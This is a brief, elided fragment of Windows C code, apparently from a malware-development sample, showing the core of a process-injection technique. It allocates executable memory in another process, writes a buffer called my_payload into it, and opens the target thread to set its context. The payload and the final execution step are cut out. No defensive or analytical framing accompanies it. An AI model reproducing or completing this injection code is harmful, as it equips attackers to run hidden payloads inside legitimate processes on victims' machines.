...
int main(int argc, char *argv[])
{
  ...
  LPVOID rb = VirtualAllocEx(ph, NULL, my_payload_len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  WriteProcessMemory(ph, rb, my_payload, my_payload_len, NULL);
  HANDLE ht = OpenThread(THREAD_SET_CONTEXT, FALSE, pi.dwThreadId);
